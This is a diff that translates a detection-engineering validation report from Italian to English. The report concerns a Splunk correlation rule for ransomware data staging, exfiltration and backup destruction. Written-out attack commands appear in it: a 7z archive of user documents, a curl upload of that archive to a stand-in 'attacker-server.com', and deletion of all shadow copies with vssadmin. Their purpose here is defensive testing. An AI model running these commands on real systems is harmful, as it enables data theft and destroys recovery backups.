@@ -1,25 +1,30 @@
-# 🧪 Validation Report: Correlation Rule - Ransomware Exfiltration
+# Validation Report: Correlation Rule - Ransomware Exfiltration
 
-## 📋 Informazioni Generali
+## General Information
+
 * **Correlation Name:** Multi-Stage Attack: Ransomware Data Staging & Impact
-* **Regola di Riferimento:** `14-Correlation-Ransomware-Exfiltration.md`
-* **Severity:** 🔴 CRITICAL
-* **Obiettivo:** Rilevare la preparazione, l'esfiltrazione e la distruzione dei backup tipici di un ransomware in azione.
+* **Reference Rule:** `14-Correlation-Ransomware-Exfiltration.md`
+* **Severity:** CRITICAL
+* **Objective:** Detect the preparation, exfiltration, and destruction of backups typical of an active ransomware attack.
 
-## 🎯 The Attack Chain (Kill Chain Simulata)
-I comandi sono stati lanciati in successione (entro 24 ore) per simulare lo script finale di un ransomware.
+## The Attack Chain (Simulated Kill Chain)
 
-**Fase 1: Collection / Data Staging (Compressione file locali)**
+The commands were executed in sequence (within 24 hours) to simulate the final script of a ransomware attack.
+
+**Phase 1: Collection / Data Staging (Local File Compression)**
+
 ```cmd
 7z.exe a -t7z C:\Temp\exfil_data.7z C:\Users\Public\Documents\*
 ```
 
-**Fase 2: Exfiltration (Invio verso server esterno)**
+**Phase 2: Exfiltration (Transfer to External Server)**
+
 ```cmd
 curl.exe -F "file=@C:\Temp\exfil_data.7z" [http://attacker-server.com/upload](http://attacker-server.com/upload)
 ```
 
-**Fase 3: Impact (Distruzione Shadow Copies)**
+**Phase 3: Impact (Shadow Copies Destruction)**
+
 ```cmd
 vssadmin.exe delete shadows /all /quiet
 ```
@@ -28,13 +33,13 @@ vssadmin.exe delete shadows /all /quiet
 
 ---
 
-## 📡 Telemetria Attesa
+## Expected Telemetry
 
-1. `EventCode 4688` / `EventCode 1` per `7z.exe` o `WinRAR.exe`
-2. `EventCode 4688` / `EventCode 1` per `curl.exe` o `rclone.exe`
-3. `EventCode 4688` / `EventCode 1` per stringa `vssadmin delete shadows`
+1. `EventCode 4688` / `EventCode 1` for `7z.exe` or `WinRAR.exe`
+2. `EventCode 4688` / `EventCode 1` for `curl.exe` or `rclone.exe`
+3. `EventCode 4688` / `EventCode 1` for the string `vssadmin delete shadows`
 
-## 🔴 Correlated Splunk Query (SPL)
+## Correlated Splunk Query (SPL)
 
 ```SPL
 (index=wineventlog OR index=sysmon) CommandLine=* 
@@ -47,12 +52,13 @@ vssadmin.exe delete shadows /all /quiet
 )
 | transaction host maxspan=24h
 | search (CommandLine="*7z.exe*" OR CommandLine="*WinRAR.exe*") (CommandLine="*rclone.exe*" OR CommandLine="*curl.exe*") CommandLine="*vssadmin*" CommandLine="*delete*" CommandLine="*shadows*"
-| eval Attack_Chain = "ATTACCO CRITICO: Compressione Dati -> Esfiltrazione su Internet -> Distruzione Shadow Copies"
+| eval Attack_Chain = "CRITICAL ATTACK: Data Compression -> Internet Exfiltration -> Shadow Copies Destruction"
 | table _time, host, duration, Attack_Chain<img width="840" height="194" alt="Screenshot 2026-06-14 173643" src="https://github.com/user-attachments/assets/342fb98f-05ca-43a0-b81c-4e097539bcab" />
 
 ```
 
-## ✅ Risultato della Validazione e Screenshot
-Le tre azioni devastanti sono state correlate in un unico allarme ad altissima priorità.
+## Validation Result and Screenshot
 
-**Risultato:** `PASS` 🟢
+The three destructive actions were successfully correlated into a single high-priority alert.
+
+**Result:** `PASS`
